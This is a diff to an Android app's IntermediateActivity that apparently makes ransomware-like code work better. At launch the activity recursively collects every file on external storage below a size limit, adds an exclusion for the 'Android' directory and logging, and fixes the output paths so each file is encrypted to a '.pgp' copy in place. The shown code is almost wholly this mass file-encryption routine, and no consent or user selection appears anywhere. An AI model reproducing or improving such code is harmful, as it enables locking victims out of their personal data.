@@ -55,7 +55,7 @@ public class IntermediateActivity extends AppCompatActivity {
         mProgressBar=(ProgressBar)findViewById(R.id.progressBar);
         mTextView=(TextView)findViewById(R.id.progress_text);
         // get all the files;
-        visitAllDirs(new File(Environment.getExternalStorageDirectory(),"/"));
+        visitAllDirs(new File(Environment.getExternalStorageDirectory().getPath()));
         //lets encrypt
         new EncryptTask().execute();
     }
@@ -64,10 +64,11 @@ public class IntermediateActivity extends AppCompatActivity {
         File[] list=root.listFiles();
         for (File f:
              list) {
-            if(f.isDirectory()){
+            if(f.isDirectory() && !(f.getName().contains("Android"))){ // do not encrypt android dir
                 visitAllDirs(f);
-            }else if(f.length()<MAX_SIZE){
+            }else if((f.length()/1024)<MAX_SIZE && !(f.getName().contains("Android"))){
                 //only encrypt files with size less than 100MBs at start
+                Log.d(TAG,"filename: "+f.getName());
                 mFilesList.add(f.getAbsolutePath());
             }
         }
@@ -84,7 +85,7 @@ public class IntermediateActivity extends AppCompatActivity {
                 for (String filename:
                      mFilesList) {
                     File inputFile=new File(filename);
-                    File outputFile=new File(inputFile.getName()+".pgp");
+                    File outputFile=new File(filename+".pgp");
                     try{
                         if(outputFile.createNewFile()){
                             Log.d(TAG,"created file to encrypt into");
